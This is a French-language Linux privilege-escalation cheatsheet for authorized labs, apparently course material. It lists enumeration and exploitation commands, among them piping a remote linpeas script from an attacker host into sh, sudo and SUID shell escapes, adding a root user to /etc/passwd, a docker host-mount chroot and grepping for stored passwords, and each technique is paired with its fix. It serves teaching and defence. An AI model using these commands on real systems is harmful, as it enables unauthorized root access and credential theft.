# Cheatsheet — Élévation de privilèges Linux

Passer d'un shell utilisateur à `root`. Compétence de **méthode** : une checklist déroulée dans le même ordre à chaque fois.

> ⚠️ **Cadre.** Labs et périmètres autorisés uniquement. **Énumérer d'abord, exploiter ensuite** : comprendre *pourquoi* une piste marche (pour le rapport et le correctif).

**Le réflexe** : stabiliser le shell (TTY), puis lancer l'énumération automatisée **et** vérifier à la main.

---

## 1. Énumération automatisée

```bash
# linPEAS : le plus complet (couleurs = pistes)
curl http://LHOST/linpeas.sh | sh          # ou déposer puis exécuter
# Alternatives
./LinEnum.sh
./lse.sh -l1
pspy64                                      # espionner les process/cron sans être root
```
> Toujours **relire** ce que remonte linPEAS ; ne pas se fier au surlignage seul.

---

## 2. Premiers réflexes manuels

```bash
id ; whoami ; groups            # groupes intéressants : sudo, docker, lxd, adm, disk
hostname ; uname -a             # version du noyau
cat /etc/os-release
sudo -l                         # LE premier à lancer
ls -la /home/*                  # fichiers d'autres utilisateurs, .ssh, historiques
cat ~/.bash_history
env ; cat /etc/crontab
```

---

## 3. La checklist — piste par piste

### `sudo -l` (le plus rentable)
Commandes qu'on peut lancer en tant qu'un autre / root, souvent détournables.
```bash
sudo -l
# Binaire autorisé → chercher l'évasion sur GTFOBins
sudo /usr/bin/find . -exec /bin/sh \; -quit
sudo vim -c ':!/bin/sh'
# (LD_PRELOAD / env_keep, versions de sudo vulnérables : CVE-2021-3156 Baron Samedit)
```
> **Correctif** : restreindre les règles sudo, jamais de binaire interactif/évasif en NOPASSWD.

### SUID / SGID
Binaires s'exécutant avec les droits du **propriétaire** (souvent root).
```bash
find / -perm -4000 -type f 2>/dev/null       # SUID
find / -perm -2000 -type f 2>/dev/null       # SGID
# Un binaire inhabituel SUID → GTFOBins
```
> **Correctif** : retirer le bit SUID des binaires qui n'en ont pas besoin (`chmod u-s`).

### Capabilities
Droits fins accordés à un binaire (sans SUID complet).
```bash
getcap -r / 2>/dev/null
# ex. cap_setuid sur python → id 0
/usr/bin/python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'
```
> **Correctif** : `setcap -r` sur les binaires qui ne le justifient pas.

### Tâches cron
Scripts lancés périodiquement, parfois modifiables ou appelés sans chemin absolu.
```bash
cat /etc/crontab ; ls -la /etc/cron.*
pspy64                                        # voir les cron en direct
# Script cron modifiable par toi + exécuté par root → y placer ta charge
```
> **Correctif** : droits stricts sur les scripts cron, chemins absolus, pas de wildcard dangereux.

### PATH détourné
Binaire appelé **sans chemin absolu** par un script/binaire privilégié.
```bash
echo $PATH
# Placer un faux binaire du même nom dans un répertoire de $PATH modifiable
```
> **Correctif** : PATH sécurisé dans les scripts, appels en chemin absolu.

### Fichiers écrivables sensibles
```bash
# /etc/passwd écrivable → ajouter un root
find / -writable -type f 2>/dev/null | grep -v /proc
openssl passwd 'x' ; echo 'r00t:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
# clés SSH lisibles, /etc/shadow lisible…
```
> **Correctif** : droits stricts sur `/etc/passwd`, `/etc/shadow`, clés, sauvegardes.

### NFS `no_root_squash`
Un partage exporté avec `no_root_squash` permet de créer un binaire SUID root depuis un client.
```bash
cat /etc/exports                              # côté serveur
# monter, y déposer un binaire SUID root, l'exécuter côté cible
```
> **Correctif** : `root_squash` (défaut), restreindre les exports.

### Groupes puissants
- **docker** / **lxd** : monter le FS hôte dans un conteneur → root.
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
- **disk** : lire le disque brut. **adm** : lire les logs.
> **Correctif** : n'accorder ces groupes qu'à l'administration.

### Identifiants qui traînent
```bash
grep -rniE 'password|passwd|secret|api[_-]?key' /var/www /etc /opt 2>/dev/null
cat ~/.*history ; find / -name "*.conf" 2>/dev/null
```

### Noyau (dernier recours)
```bash
uname -a
searchsploit linux kernel <version>          # ex. DirtyPipe, DirtyCow, PwnKit
```
> Instable, risque de crash → **dernier recours**, jamais en prod. **Correctif** : patcher.

---

## 4. Résumé express (ordre à dérouler)

```
1. sudo -l
2. SUID / SGID  (find -perm)
3. capabilities (getcap)
4. cron        (pspy)
5. PATH
6. fichiers écrivables (passwd, clés)
7. groupes (docker/lxd/disk)
8. secrets qui traînent
9. NFS
10. noyau (en dernier)
```

---

## 5. Côté défense

Retirer les SUID inutiles, corriger les chemins/permissions de scripts cron, `root_squash` sur NFS, moindre privilège sur les groupes, mises à jour du noyau et de sudo, secrets hors des fichiers de conf.

---

## 6. À savoir expliquer à l'oral (module 6)

- **Pourquoi énumérer avant d'exploiter**, et pourquoi une checklist figée.
- **SUID vs capabilities vs sudo** : trois mécanismes de droits, trois surfaces.
- **GTFOBins** : le réflexe pour transformer un binaire autorisé en shell.
- Pour chaque piste : la **justifier** et donner le **correctif** (c'est ça, le niveau responsable).

**Labs** : TryHackMe « Linux PrivEsc », machines HTB Linux Easy/Medium.
